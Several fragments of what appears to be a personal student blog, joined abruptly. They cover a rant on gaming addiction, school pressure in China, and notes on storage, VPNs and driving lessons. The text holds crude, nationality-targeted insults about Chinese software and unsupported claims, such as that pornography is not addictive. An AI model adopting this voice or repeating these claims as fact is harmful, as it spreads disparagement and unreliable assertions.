world.</p>\n<p>Thus, there is a lack of <code>API</code> in gaming. Things can only\nbe controlled via the frontend GUI. Now, I am not against frontend GUIs,\nbut I don\u2019t like certain frontend GUIs. Usually, you can see the amount\nor level of control the app gives you from the frontend GUI at one\nglance, to know which apps are easy to control and which ones are buggy.\nThe most popular games seem to me at one glance to be very hard to\ncontrol in the frontend part, usually requiring an enormous amount of\neffort over an extended period.</p>\n<p>Now, how does gaming make you stay on the page for an extended\nperiod? Obviously, by invading one\u2019s brain to a toxic level.</p>\n<p>Modern games typically have complicated (buggy) UIs and lack the\ntransparency seen in open-source software, which means it is exploiting\nthe user. Games should be transparent and be able to run on one\u2019s own\nserver. Games should have their source code revealed for users to\nunderstand and modify. There are certain proprietary software that is\npretty good, but for gaming, since they are unnecessary and aiming to\ncontrol me, I believe that open source should be a must.</p>\n<p>Moreover, they usually charge fees for virtual props, which is\ncompletely unreasonable. I can pay for a VPS server or pay for a cloud\nbucket, which actually provides me with valuable services. But to pay\nfor something virtual that only exists in a certain proprietary shitty\ngame? Hilarious! You don\u2019t get anything from your money, and it only\nneeds to change a value in its backend to charge you. Paying in gaming\nis a great disrespect to money, and shows great irresponsibility.</p>\n<p>Say, someone displays a number on an HTML page, and when you give him\nmoney, the person increases that number the same as the amount of money\nyou give. Does it seem appealing to pay? No.\u00a0Of course, modern banks are\ntrusted services, and they are considered secure and preserve your\nmoney. But literally, any server changing a number in the backend should\ncharge you nothing at all.</p>\n<p>This is far more unreasonable than VIPs or Premium Subscription\n(which most I find unreasonable enough). Paid subscription to a service\nusually means more usage and more bandwidth costs, etc., so that has a\npoint. But gaming, which gives you absolutely nothing more usually with\npaid features in terms of costs, is just very unreasonable. Moreover,\nyou can run those services like video tubes and stuff on your own\nserver, whether an old laptop or raspberry pi or a cloud VPS, and spend\nmoney wisely. However, gaming relies on the external server, meaning\nbeing a slave to the master, which is the gaming company.</p>\n<p>Gaming does provide a chance to engage with people. But I think\nself-hosting is a better option, and then I can invite people to my own\nservers, where I make the rules. I am generally fine with centralized\ngaming servers as long as they make the rules clear, which they don\u2019t.\nSo in return, what they give you is completely determined by them. You\nhave nothing, they have everything. They can wipe out the account and do\nwhatever they want easily, you are powerless and can only work limited\nto the buggy frontend.</p>\n<h2 id=\"about-setting-limits\">About Setting Limits</h2>\n<p>Bloatwares doesn\u2019t stop because you told them to in their shitty\nfrontends. You install a malware and it will always hunger for the\nresources and try to exploit your system. The same is with gaming. You\ntry to enforce strict restrictions to it systemwide and it complains a\nmillion times a day until you remove it.</p>\n<p>I set limits to how much time you game a day and my mind doesn\u2019t\nlisten. I remind myself to take breaks and I can\u2019t. The only way is to\ntell gaming to f**k off.</p>\n<h2 id=\"other-kinds-of-shitwares\">Other kinds of shitwares</h2>\n<p>There are other kinds of very shitty softwares, that make me very\nmuch addicted and is pretty much useless, bloats, that cause all sorts\nof damage and trouble. It is advised to stay away from them.</p>\n<p>Examples include video tubes, crappy social media, etc.</p>\n<h2 id=\"why-is-prn-different-from-gaming\">Why is P*rn different from\nGaming</h2>\n<p>P*rn and gaming are substantially different because p*rn isn\u2019t\naddictive.</p>\n<p>I am not saying P*rn is good for something but come on guys, you\ndon\u2019t ma$turb@te over 3 times a day.</p>\n<h2 id=\"why-open-source-is-the-solution\">Why Open Source is the\nsolution?</h2>\n<p>Open source is the solution because it has the source code, granting\none control. A person can compile and read the source code, and as a\nresult, the code doesn\u2019t dominate the user.</p>\n<p>The companies refuse to release the source code for games. This is\nnonsense. All games shall be open source, and give user the freedom to\nmodify! I want to modify parts of a game myself or tune it, and there is\nno way but to comply with the company behind it! The company hosts the\ngaming in its own servers, and who knows if it is secure??? The lack of\ntransparency is at concern.</p>\n<p>I am not saying proprietary is bad, or whatever, but to be honest\nopen source is good. I like Google to be honest(LOL).</p>\n<p>Also I like binary blobs like Arch Linux Repos, where youc an install\nstuff quickly with one command. But the fact is that they are open\nsource and compiled in the first place.</p>\n<h2\nid=\"why-are-gaming-very-similar-to-shitwaresespeically-chnee-shitwares\">Why\nare gaming very similar to shitwares(espeically CH!NE$E SHITWARES)?</h2>\n<p>Shitwares are similar to games in nature. The two share many striking\nsimilarities.</p>\n<p>Both are very bloated, both require heavy GUI to work.</p>\n<p>I don\u2019t have one reason to get bloat in the first place, I mean,\nhonestly gaming isn\u2019t necessary, so I should uninstall it. Installing\nbunch of bloat on my computer of phone system is bad in the first\nplace.</p>\n<p>With heavy \u201cGUIs\u201d(and crappy, nonfunctional, broked, old, dirty), and\nno api stuff, both gaming and CH!NE$E SHITWARES are controlling the\nuser, aiming to censor and infect the user and the user\u2019s computer/mind!\nYou can\u2019t do anything, it isn\u2019t free, you pay whatever price company\nsays.</p>\n<p>Ch!ne$e shitware companies ask you to identify yourself every 5\nseconds. And that\u2019s not enough. Shitty A!!pay requires a picture of ID\ncard to log in, and I don\u2019t have one with me LMAO.</p>\n<p>You have completely no control over the game. It is not something you\ncan master or learn, but the company(or autonomy) decides for you. The\ncompany can change the game at any moment, can go malicious. Thus, there\nis absolutely no point in gaming anyways. You are making a fool out of\nyourself by gaming.</p>\n<p>I really hate stupid guis because they are just mostly unnecessary.\nWhy can\u2019t one person control stuff from command line? From python\nlibrary? From npm library? There shall be enough of those for something\nto be fun!</p>\n<h2 id=\"why-is-gaming-similar-to-bdm\">Why is gaming similar to\nBD$M?</h2>\n<p>Gaming is like BD$M, and users acts like \u201cSUB\u201d, or \u201cM\u201d, and companies\nare \u201cDOM\u201d, or \u201cS\u201d. The user got tied up and spanked and strangled and\nchocked, and the company laughs and gets on top of the use, and shits on\nthe user, does whatever they want.</p>\n<p>Except BD$M can be actually enjoyable(like in Fifty Shades of Grey\nseems enjoyable), but gaming can\u2019t.</p>\n<p>BD$M has \u201cconsent\u201d in it, where DOMs don\u2019t do everything to subs,\ninstead, they agree on the limits strictly. Say, someone says no to\nbreath-play, so they would agree and not do it. Doing anything more than\nconsent is considered \u201cRape\u201d, and strictly illegal, and shall be subject\nto jailtime.</p>\n<p>Gaming also has \u201cconsent\u201d in it, where users would agree to some\n\u201cterms and conditions\u201d in the before clicking into the game. Except\nusers don\u2019t look at the terms and conditions, and usually go through\nthem very quickly. As a result, company can write anything in those\nterms and conditions, and thus they have endless consent(like sell your\ndata lol).</p>\n<p>This is similar to BD$M, where DOMs(usually male) objectify SUBs, and\nobjects can\u2019t give consent anyways. So, in the end SUBs(usually female),\nends up automatically granting a lot more than suitable. In reality,\npeople neglect those consents, and this makes the SUB very\nuncomfortable, hurting their lives and causing life-long emotional\nproblems.</p>\n<p>Gaming to me is the same. I was pushed into consent by those shitty\ncompanies(which are malicious and hope to earn my money). When opening a\ngame, it is like going into the BD$M fantasy. It seem very intriguing to\ngo into but as it continues the SUB is endlessly exploited, deprived of\nhuman rights, and will have extremely low self-esteem and life\npositivity.</p>\n<p>Gaming objectifies the user. Javascript games are better because they\ndon\u2019t require installing malicious malwares on my computer. But they are\nmalicious(most of them are) anyways.</p>\n<p>When you give company endless limits(just no limits), they will try\nto get as much as they want. User will be chocked, wipped like a slave,\nkicked and punched, whatever. Users will lose money when company demands\nit.</p>\n<p>I have a lot of emotional distress even now, suffering from gaming\nfrom a few years ago. Gaming traumatized my life.</p>\n<h2 id=\"about-other-people\">About Other People</h2>\n<p>Whether or not other people like gaming is none of my business.\nPeople do whatever they want as long as they don\u2019t affect me personally.\nSome people don\u2019t feel gaming is taking control over their mind (there\nare definitely a lot of those people existing), and I admire them for\ntheir perseverance because I don\u2019t have the endurance to go against\ngaming long-term. Overall, I have a lack of knowledge about people in\nthe world, so I will just settle here.</p>\n<p>As I found out, normal people are incredibly good at controlling\nthemselves from not being overly addicted to gaming. Not me! I am very\nemotionally weak and at a severe lack of self-control. I am very prune\nand easily damaged by those gaming stuff. I am not resilient and\npersistant at all. I am very very weak and vulnerable mentally and\nemotionally. I am not very competent in handling such stuff(I don\u2019t\nthink I will be in the near future, I have a history of not being able\nto handle stuff like this well).</p>\n<h2 id=\"evil-nature\">Evil Nature</h2>\n<p>The fact that I cannot quit gaming even though I tried for so many\nyears tells me something about the evil nature of it. Not all games are\nevil, but at least it contains some very dark instances. Sort of like\ngoing into \u201cMyanmar\u201d or \u201cUkraine\u201d or \u201cNorth Korea\u201d won\u2019t necessarily be\nlife threatening(this is in 2024), but most likely will.</p>\n<p>What I can learn is that I gained absolutely nothing from gaming. So\nit is like the result will always be negative, in fact, having a huge\nchance of being very negative.</p>\n<h2 id=\"librejs\">LibreJS</h2>\n<p>Perhaps a good way to cope with gaming is to install LibreJS. It is\nmore of a extreme way, but certainly plausible and a measure to be taken\nin extreme consequences. Doing so will stop users from visiting any of\nthe mainstream sites like YouTube, Twitter, Reddit, and be redirected to\na libre instance.</p>\n<p>I don\u2019t use LibreJS now.</p>\n<p>However, this is a good way of stopping games altogether because\ngaming most certainly requires nonfree javascript. So in the end users\ncan live happily under the shield of free and healthy javascript and not\nbe forced to consume those drugs and malicious company based\njavascript.</p>\n<h2 id=\"whats-nedfdxt\">What's next?</h2>\n<p>I gamed for more than 600 hours in the past year(note: this is in Sep\n02 2023), that is the equivalent of losing one half month.

I ought to be guided by\nadults, and that is the only way how it worked.</p>\n<p>Back then besides trusting adults, I don\u2019t know what else to do\nmyself. Everything I knew was taught by them.</p>\n<h2 id=\"recent-years-in-school\">Recent Years in School</h2>\n<p>In recent years I faced significant challenges in academics, and it\nonly intensifies each year with no signs of relief.</p>\n<h2 id=\"my-efforts-to-copedying-interests-and-activities\">My Efforts to\nCope\u2013Dying Interests and Activities</h2>\n<p>I tried hard to cope with school, at drastic measures. I didn\u2019t\nremember myself being, or identifying this strong with minimalism\nbefore.</p>\n<p>Now, disclaimer, I am not saying that these actions are wrong, some\nof them proved to be beneficial in the long run, with or without school.\nBut I feel like these are forced upon me.</p>\n<p>In my freshman year in university, I didn\u2019t use a smartphone for half\na year. I looked like an idiot at that time. The school needed to test\nCOVID with a smartphone, and I brought the ID card with me all the way.\nI had to use cash at the counter. I looked like a total idiot. Nobody,\neven nobody remotely, tried to do that. It is unheard of. I did this\nsolely to put myself away from distraction. People would occasionally\njoke about not using smartphones, or take my practice as a joke, but it\nwasn\u2019t a joke for me, it was a serious struggle.</p>\n<p>I completely got rid of gaming. I went against it so hard I hated\nmyself. It was no easy task, with gaming frequently crawling back and\ntrying to dominate my time. Those days were struggles one after another,\nhard-fought mental battles, and occasionally losing one or two days, but\nthen trying even harder. It was a really challenging task, but I did\nindeed manage to complete rip off gaming, which I was once quite\naddicted.</p>\n<p>I stopped reading completely. I was very enthusiastic about the\nliterature. I would read 3-6 interesting novels monthly, mostly YA or\nfantasies or romances or mysteries, but not any more. I didn\u2019t read at\nall for 2 years. Not that literature is as bad as gaming, but it fails\nto appeal to me anymore. I live in this boring and mundane life, and\nreading literature once made me wonder, and go fly in the fantasy\nuniverse, not any more now. Things are not changing.</p>\n<p>I had no social media. No, nothing. Just, nothing. I deleted Twitter,\ninstagram, Mastodon, Telegram. I once had them and for the sake of\nconcentrating, removed all my contents and deleted those. I deleted all\n\u201cmoments\u201d in WeChat.</p>\n<p>I tried at least 10 times to adjust my night owl schedule starting\nsophomore year. It was a failure, and up to this day I still have the\nnight owl schedule, staying up to 3 am -6 am, just not wanting to sleep.\nI tried to wake up early , succeeded for a few days, then go back to the\nschedule again after some things start bothering me.</p>\n<h2\nid=\"callbacktrying-to-start-a-new-life-pre-high-school\">Callback\u2013Trying\nto Start a New Life Pre-High School</h2>\n<p>Back in the summer before high school, I was trying to start a new\nlife. Ask me then and I would be very enthusiastic. \u201cOh, just imagine\nthe things I will do!\u201d</p>\n<p>I had 6 interests back then. I liked running, walking, Ci Poetry,\nMath, English Literature, Musical Instrument. I thought that balancing\nthose with the school would be very easy, especially when half of my\ninterests align with the school\u2019s main courses.</p>\n<p>Turns out anything but. My high school is a dictating prison.</p>\n<p>People never take interest seriously back there, making room for\nstudying 15 hours a day. All my interest back then got dropped, or\n\u201cprioritized\u201d.</p>\n<h2 id=\"high-school-frequent-failureslost-of-control\">High School:\nFrequent Failures\u2013Lost of Control</h2>\n<p>I failed frequently in Chemistry in my high school years. Despite my\nefforts to study and get a modest score, things never work for me. I\nstudied Chemistry really hard in the first semester second half after\ngetting only 60 on the mid exam, putting in the recess time and always\ntrying to memorize those concepts, paying in significant more time. But\nI only got 56 on the final, failing miserably. I thought something was\nwrong when it didn\u2019t turn out like I wanted. I wasn\u2019t discouraged and\nwas determined to try harder. In the winter holiday I enrolled in a cram\nclass for 3 hours a day studying Chemistry, even paid more much effort\nto it than I did in math, only aiming for a modest and reasonable score,\nnot to let it stand out, but despite getting 80 on the starting exam in\nthe second semester, I got only 58 in the middle exam in the second\nsemester. I did all I could, and took multiple similar tests beforehand,\nbut still failed, again and again. At that point all hope seemed lost,\nand I quit the cram class and hate the subject so strongly ever since.\nIt seemed like my efforts are unrelated to the scores, and the teacher\nnever encouraged me or praised me, which I longed for so hard. Instead,\nhe said in a mockery manner that those who got low scores didn\u2019t try\nhard and would \u201cobviously\u201d get really good scores had they genuine want\nto learn. I got scared of the teacher. My father first said that I was\nslacking off, but, after seeing me being really sad, instead, said in a\nplayful manner maybe this is just not for me. To this day the pure\nmention of Chemistry would make me want to lock myself in a toilet and\ncry.</p>\n<p>I failed frequently in Chinese, in almost every test. I hated Chinese\nand the damn teacher so much. She never explained those broad or\nunrestrained poems well, and everyday was like, recite this and recite\nthat, and recite everything I said. I really tried to listen to her and\ntried to recite those phrases, but after trying very hard, got lower and\nlower Chinese scores, always far from the average.</p>\n<p>Ci poetry was a thing I loved. I could recite a whole book of Ci\npoetry with 60 pages, on any page start a line I could recite the rest\nof the poem. I did it out of pure passion, not because some shit teacher\nforced it upon me. During the conoravirus I would lean by the window,\nlooking at the falling of the April rain, and the poetries touched me\ndeeply. In May, as I was walking in wet grasses along the river and the\nblossoms of spring came, yet feeling so lonely and isolated. Those poems\ncame naturally into my mind.</p>\n<p>But high school Chinese makes me hate the subject so much, ahh, like,\nit never sparkled my interest, and I was always failing or around\nfailing at 92 or 95 out of 150.</p>\n<p>But the most humiliating thing is English. My English teacher in high\nschool frequently criticized me because I wasn\u2019t \u201cstudying hard\u201d, and\nalways recognizing me as a low performer in the subject needing immense\nhelp. In exams, I was frequently below average in English. The only time\nI got average score she said to me I done decent was even more\nhumiliating. Now, it is an ESL country. I read more than 500 YA lit\nbooks before high school, and it was my favorite thing to do back then.\nNot long after leaving high school, I got 109 in TOEFL. If there was\nanything more unimaginable than that, I don\u2019t know.</p>\n<p>I didn\u2019t even show my English Blog in high school till the end of\nhigh school, where I wrote at least 20 book reviews. I like English so\nmuch, and I have a real passion for the language. I used to read 1 hour\ndaily about anything in literature, immerse myself in the English only\nlibrary, and dig deep into those fantasy landscapes. I was being\ncriticized and not being recognized in something I was truly passionate\nabout, and being frequently compared, and looked down upon as very poor\nin this subject.</p>\n<p>I was also poor in Biology, History, Politics, but I don\u2019t want to\nexpand anymore. I can literally go on for ages, it\u2019s not relevant\nhere.</p>\n<p>Anyway, long story short, I lost control, and the rest of my high\nschool was spent in anxiety and despair.</p>\n<p>Some day last month I had a nightmare in high school, and there was\nan exam, I believed I did well in every subject in the exam, I was\nlighthearted and happy for a moment before I realized the answers\nbetrayed me, and I failed in every one of them. It was the most vivid\ndream I had in a while.</p>\n<h2 id=\"difficulties-in-living-in-the-dorm\">Difficulties in Living in\nthe Dorm</h2>\n<p>In my freshman year in college, I had significant challenges in\nliving in the dorm. I was very different with my dormmates.</p>\n<p>One of my dormmates has this strange habit of making his alarm ring\nas early as 6 am and not shutting his arm or getting up until like 9 am.\nI was always waked up by that, and it was so loud and annoying. He never\nacknowledged his behavior, the strange thing is, nobody else in that\ndorm seemed to mind it. I always thought I was a crazy person. I\ncomplained frequently and our relationship got worse because of it. I\nabsolutely couldn\u2019t bear this behavior, and the teacher didn\u2019t\nunderstand me as well, and my parents didn\u2019t understand it, and my\nfather noticeably said you just bear it.</p>\n<p>My roommate was frequently lying on the bed, usually playing games\naloud till around 2 or 3 am. I don\u2019t understand these kids.</p>\n<p>I had really bad sleeping disorders and always needed to sleep around\n2 hours in the afternoon or mornings.</p>\n<p>I never spoke with that roommate for 6 months, not one word, because\nwe just couldn\u2019t speak or communicate.</p>\n<p>Thus living in a dorm became a nightmare ever since. In my journal\nafter saying stating I am minimalistic, I would always \u201ca separate quiet\nroom\u201d after that.</p>\n<p>I also had significant difficulty in military training days before\nschool started. I started thinking that this is going to be hard to get\nthrough right away and I just didn\u2019t have the same enthusiasm. The\n\u201cofficers\u201d only made us \u201cmove your legs as if running, while you stay in\none place\u201d or just \u201cwalk\u201d, and I did, and a short officer came to me\nright away, and forced me out of the formation of students, and saying I\nwasn\u2019t paying attention. He made me do that move for a long time while\nother students pointed and laughed at me like I was a weirdo. I was\nmarginalized, and I hated the damn training even more.</p>\n<p>Anyways we seperated into small groups and the \u201cgood\u201d ones got\nassigned into the formation group where they would walk around a cricle\naligned(how freaking boring), and I got aligned to the group to wave\n\u201cflags\u201d, and got kicked out by another \u201cofficer\u201d from the group because\nI didn\u2019t wave the commuist flag well enough. Somehow I was able to pass\nthe training sitting on a bench along the playground passing as those\n\u201cinjured\u201d or \u201cdisabled\u201d students. It was so lucky for me.</p>\n<p>After that, military training or all kinds of conscription became a\nnightmare for me as well. Lucky for me conscription isn\u2019t required.</p>\n<p>When I speak out about these matters they were always neglected and\npeople never took them seriously, only acting like, \u201cWell, you seem to\nbe crazy, maybe just do whatever you want\u201d attitude.</p>\n<p>The thought that my parents understood me, and cared for my mental\nhealth shattered. Their \u201cpromises\u201d are fake and ingenuine, saying\n\u201cthings will turn out well\u201d without caring about anything. I saw no hope\nin them getting me out of the darkness. The fact that I thought those\npeople cared for me, really had an idea of what\u2019s going on but made me\nface these things alone, frequently to an unbearing point, me barely\nmanaging to get through, only caring about exam results, it just made me\nlose trust in them that is forever irretrievable.</p>\n<p>Because I was frequently backed to a corner. Their \u201creassurances\u201d\nwere just to put off my feelings, I felt hopeless and lonely.\nInteresting discovery, my parents thought I was \u201cfine and happy\u201d in my\nfreshman year.</p>\n<h2 id=\"reflection-what-caused-the-incident\">Reflection: What Caused the\n\u201cIncident\u201d</h2>\n<p>The PE teacher when he intentionally failed me on Taichi. He said,\n\u201cYou didn\u2019t pay any effort.\u201d</p>\n<p>Back then, I didn\u2019t lose all trust in my parents or adults.</p>\n<p>It wasn\u2019t specially targeted to the PE teacher.</p>\n<p>I got full marks in the 3000m run and pull-ups through reasonable\nefforts. The teacher said I failed in the first try. I practiced the\ncrooked \u201ctaichi\u201d for a whole 3 days leading up to it, sacrificing my\nnoon time, for the second try, only aiming to get a reasonable effort. I\npaid a lot more effort than most people.</p>\n<p>But he still decided to fail me there, in contrast to my full marks\nin running and pull-ups. I was in a hopeless and dark moment when I\nrealized that in some situations no matter how hard I work I am always a\njoke. It was worse than not working at all.</p>\n<p>At that time I was in a very very weak and vulnerable point. It was\nbecause I just couldn\u2019t hold things back anymore. That was my last\nstraw. I did something very unreasonable. I cursed the teacher in the\n\u201canonymous\u201d feedback form, and wrote something like \u201cdie\u201d.</p>\n<p>And I didn\u2019t do anything else than, quietly accepted the result, and\nthings didn\u2019t escalate.</p>\n<p>But on the coming semester on my 17th birthday exactly, the teacher\ncalled my parents to say they received \u201charsh\u201d comments, and it was very\nvery serious, turns out the form wasn\u2019t anonymous, and I got a\npunishment from school, but lucky for me, no serious consequences.</p>\n<h2 id=\"more-resiliencebut-leading-to-imposter-syndrome\">More\nResilience\u2013But Leading to Imposter Syndrome</h2>\n<p>In recent days, somehow I became far more resilient with criticism of\nteachers or feedbacks from schools. My efforts not paying off seem like\nnorm rather than exception.</p>\n<p>I had faced significant imposter syndrome these years after efforts\nand seemingly perceived good work frequently turned out failing so bad.\nWhen I was trying hard to do something, I often met with failures or\nmissing the entire point.</p>\n<p>On the other hand, I engaged in depth in other fields even without\nmuch effort.</p>\n<p>When I finished coding my personal website people ignored it, but I\ndon\u2019t really care though. At the same time, I began not to care about\nother people, I isolated myself from the crowd, always crouching in the\nlonely bedroom at my computer. I had no social media, just no.</p>\n<p>Another thing caused me to isolate myself. On the sophomore year, it\nwas my first attempt to participate in a coding competition, and my\nteammate frequently complained not able to read English. She complained\nevery 5 seconds, and spread large negativity. I said, \u201cwhy don\u2019t you\nopen a Microsoft Word and paste the English problems and right click on\nit to translate to Chinese?\u201d She did, and she was alleged \u201ccheating\u201d\nbecause \u201cgoing online\u201d isn\u2019t allowed, and everyone blamed it on me.\nMoreover, the crooked committee threaten to \u201cban the school for 2 years\u201d\nbecause of the \u201ccheating\u201d incident. People I didn\u2019t know started\nbadmouthing me and cyberbulling me in the group chat, with my parents\nfrantically coming to help me out. Someone posted a question about this\ndebate on the Chinese quora, \u201cWhether should the school be banned for 2\nyears?\u201d, and it reached top 1 hottest question. There were no rules on\nthe official website before the event, with the committee frantically\nadding \u201crules\u201d to it after facing backslash. Anyways, my first\n\u201cofficial\u201d experience with competitive coding ended sadly, and I don\u2019t\nlike competitive coding ever since.</p>\n<p>People didn\u2019t acknowledge my works or efforts, or, the acknowledgment\nnever came on point, it was frequently off the point and seemingly\nunrelated to whatever I was doing. People praise me but for another\nreason, I don\u2019t like it, and most of the praise is aimed at something my\nparents done instead of me(Anyway, if you look at how much I have, I am\nnot earning anything, everything I have is from my parents).</p>\n<p>Or it is aimed at something trivial. Like \u201chow could you understand\nEnglish easily?\u201d or \u201cwow you use command line when there is GUI?\u201d, but\nactually, I had equal confusion, like, \u201cisn\u2019t English better for telling\nEnglish stories?\u201d or \u201cisn\u2019t cli much more controllable than GUI?\u201d</p>\n<p>Thus after the imposter syndrome I also came to just completely\nignore the things I am bad at, just put it off, unwilling to put any\neffort into those things uninteresting to me at all, and usually drift\noff for hours, several all-nighter at times, for the passionate or\nalluring things, most recently cloud computing and frontend, before that\ndevice exploration, void of everything surrounding and things happening\naround me. I had to force it this way because the harsh reality was just\ntoo much for me to deal with anyway.</p>\n<p>Now if the \u201cPE teacher Incident\u201d occurred again I wouldn\u2019t really\ncare, in fact, maybe it just did happen, but I just turned a blind eye\ncompletely.</p>\n<p>I became numb, I wasn\u2019t the person I once was, who would smile and\ncry at remarks teachers made. Instead, I dived deep, droning out the\nvoice around me, getting ignorant and more carefree.</p>\n<h2 id=\"why-do-i-hate-school-so-much-now\">Why do I Hate School So Much\n(Now)?</h2>\n<p>The process of hating something usually spans for a long period, and\nright now, noticeably, I absolutely cannot bear it anymore. The hate\nbegan as early as high(middle) school.</p>\n<p>My parents kept bringing up straight A+ students, especially when I\nalready worked hard and had significant mental challenges. That\u2019s not\ngoing to motivate me.</p>\n<p>That\u2019s just going to shatter my self-esteem make me realize I am\nworth nothing in school, and make me hate school a lot more than I\nalready did. Lack of self-esteem is relatively easy to overcome, I had\nloads of experiences coping with really low self-esteem, and it\u2019s\nusually not a direct cause of problems.</p>\n<p>But hatred of school is a problem. The more I thought about people\nperforming far better than me in schoolwork, the more I realize that I\nwas limited by school, knowing it led me nowhere, and I worth nothing\nhere. It made me hate the homework much more, and become even more\nreluctant to follow the teacher.</p>\n<p>The fact I was putting away my interests, letting other activites\ndie, trying to focus and still bad in school made me realize I am a\njoke.</p>\n<p>Studying, as a result, causes great friction as I pull through. I am\nnot quitting studying anyway, I am usually a very obedient and\ndown-to-earth person, and I always make that decent effort to do things,\neven in those times when I greatly disagree with it and thought it\nwasn\u2019t the best thing for me to do. I still paid the same effort, only\nleading to less work and procrastinating more, and noticeably, began\ngravitating more towards other things.</p>\n<h2 id=\"what-is-a-successful-teenager\">What is a Successful\nTeenager?</h2>\n<p>There are a lot of emerging athletes in soccer, running, skating, and\ngetting multiple awards at the age of 19. That is very successful.</p>\n<p>Also, a promising young singer getting millions of views on YouTube\nis successful. A dancer, a painter, a writer.</p>\n<h2 id=\"i-learned-nothing-in-school\">I Learned Nothing in School</h2>\n<p>I didn\u2019t learn about any valuable things in school, well that is\nuntil I visited UC Berkeley for a year. But I was also under extremely\nhigh academic pressure and unnecessarily very much in despair and\nself-doubt these years.</p>\n<p>The Ch!nese school system now is an authoritarian nonsense, with\npeople frequently underestimating its negative impacts. It\u2019s full of\negregious lies and brainwashing, filled with meaningless propaganda and\ngaslighting.</p>\n<p>I hate school so much.</p>\n<p>Teachers here are hugely unqualified and school courses on certain\ntopics are just boring, far more boring than self exploration.,</p>\n<h2 id=\"some-university-cs-teachers-in-ustc-dont-understand-git\">\u201cSome\nUniversity CS Teachers\u201d in USTC Don\u2019t Understand <code>git</code></h2>\n<p>Some also never heard <code>docker</code>, <code>nodejs</code>, never\nused <code>cli</code>, or <code>API</code>. No more words are\nneeded.</p>\n<p>I tried really hard to inform the teacher the system he try to make\nstudents build is very insecure and ambiguous, and lacks captcha,\npasshash, pepper, CSRF. But these are mild problems compared to the\nteacher not being aware of authentication at all, let alone least\nprivileges! To which the TA \u201ckindly\u201d replied, \u201cDo whatever you want, and\ndon\u2019t bother with us. You think difficult, you do more work.\u201d</p>\n<p>In another class the teacher repeatedly refuse to help with problems\non the school\u2019s Windows(which I never use of course so I don\u2019t know how\nto fix) desktop computer, claiming he don\u2019t know about it too, clumsily\nopening a few window before rebooting and out of measures, didn\u2019t seem\nto how to fix the bug. \u201cWell, you must still finish!\u201d he said.</p>\n<h2 id=\"most-grownupsteachers-arent-responsible\">Most Grownups/Teachers\nAren\u2019t \u201cResponsible\u201d</h2>\n<p>Most grownups don\u2019t know what they are talking about, but the problem\nis, they like to pretend.</p>\n<p>The more I grew up, the more I came to realize that adults have a\nstrikingly small knowledge base or speak contrary to reputable sources,\nespecially in tech. They talk like they know it, and they don\u2019t correct\nit if people misunderstand them, or they do not have the right\ninfluences.</p>\n<p>Grownups are strikingly irresponsible in this sense.</p>\n<p>Most teachers lacked significant expertise but had a strong influence\non students or the class climates.</p>\n<h2\nid=\"grownups-not-gonna-respect-you-until-you-get-rid-of-them\">Grownups\nNot Gonna Respect you Until you Get Rid of Them</h2>\n<p>There is a great power imbalance when some grownups talk to me. They\nseem far more superior, acting like authorities.</p>\n<p>Don\u2019t believe those grownups, don\u2019t give a damn about their promises\nto \u201cbe equal and kind\u201d, just get rid of them. Then they can treat you\nfairly.</p>\n<p>High school teachers are an example, they frequently condemn and\ntower over me. I feel so much better getting rid of those annoying high\nschool teachers and getting out of the goddamn shitty high school.</p>\n<p>These days if I go back, the high(or middle) school teachers won\u2019t\ntreat me this way anymore, they would treat me like an old friend.</p>\n<p>My parents are another example.</p>\n<p>When I came back from the United States the first day my parents had\nplans for me, and what I should do. They arranged for me to study car,\ngo to a traditional Chinese doctor for bone treatment, and, while I was\nundecided, claim it was good for me. It failed badly. Since they had\nautonomy over me, I had to agree. It ended miserably with me hating\ntheir decisions, having a huge argument, my parents not taking the blame\nand claiming they knew better, me quitting learning to drive halfway,\nand me going back to Hefei quickly.</p>\n<h2 id=\"about-choices-decisions\">About Choices &amp; Decisions</h2>\n<p>The ultimate reward for me is time-accumulated happiness, that is\nwhat I hope to maximize, and perhaps many other people hope to achieve\nin life.</p>\n<p>For me, minimalism is an important global heuristic. Global here\nmeans static in time, and just the global being. For example, enjoying\nsome decorations isn\u2019t going to make me happy in the long run. It does\ngive me enjoyment today, but tomorrow I will find it ugly. Also,\ndecorations take effort and that effort is more than the total rewards\ngiven by the decorations. Of course, I am not against decorations most\nof the time, but trying to keep it in a minimized, non-intrusive manner,\nand I am just illustrating a point. In the global sense, minimalism\nisn\u2019t the only heuristic, there are also other heuristics, like freedom,\nautonomy, and compatibility with society, that largely guide and\ninfluence my choices and decisions.</p>\n<p>For local regions, however, practicality and no-nonsense matters\nmore, and are important heuristics. I am not going to use a Window\nManager or delete most of my laptop applications, although it makes my\nlaptop more minimal. Aligning with mainstream or the popular choice\ntakes less effort and causes less misunderstanding, while a strict\nminimum is usually niche and almost seems like an additional hobby or\nchoir, sometimes causing it to be heavier and costier in the global\nsense.</p>\n<h2\nid=\"understanding-grad-schoolit-is-the-start-instead-of-the-end\">Understanding\nGrad School\u2013It is the \u201cStart\u201d instead of the \u201cEnd\u201d</h2>\n<p>Grad school seems an escape from my current worries, (hopefully\nself-sustained) getting rid of parents, who would be thousands of miles\naway, having more autonomy to dive into some truly engaging things,\naiming to live a truly simple and minimalistic life, and being called\n\u201cexpert\u201d once graduated.</p>\n<p>Except,\u2026, right?</p>\n<p>That remains to be known.</p>\n", "_id": "66689636547d3fe098118772"}

The allure\nof Osaka's beauty piqued my interest, despite never having visited\nJapan\u2014a trip I aspire to make one day.</p>\n<h2 class=\"header\" id=\"personalStorage\">Transitioned to Personal Storage\nSolutions</h2>\n<p>I invested in Linode's object storage, even though it's pricier than\nmainstream options like Dropbox (Linode's 1 TB is $20 compared to\nDropbox's 2 TB for $10). Despite the cost, the open-source nature of\nLinode appealed to me. To manage my files, I set up a filebrowser\nfrontend and a backend with s3fs, which offers an experience akin to\nDropbox.</p>\n<h2 class=\"header\" id=\"vpn\">Acquiring a VPN</h2>\n<p>Navigating the internet in China necessitates a VPN.

A reliable VPN is critical for comfortable browsing and\ncommunication.</p>\n<h2 class=\"header\" id=\"subparSoftware\">Dealing with Subpar Software</h2>\n<p>I've found much of the software in China frustratingly inadequate.\nThe Chinese Telecom App, for example, is a source of constant\nirritation. There's a notable lack of quality, open-source options that\nallow for customization. Even a driving car app has proven to be a\nnauseating experience.</p>\n<h2 class=\"header\" id=\"drivingAndDental\">Learning to Drive and Dental\nPlans</h2>\n<p>Though reluctant, I'm learning to drive at my parents' insistence,\nspending much of the winter holidays at home for lessons.

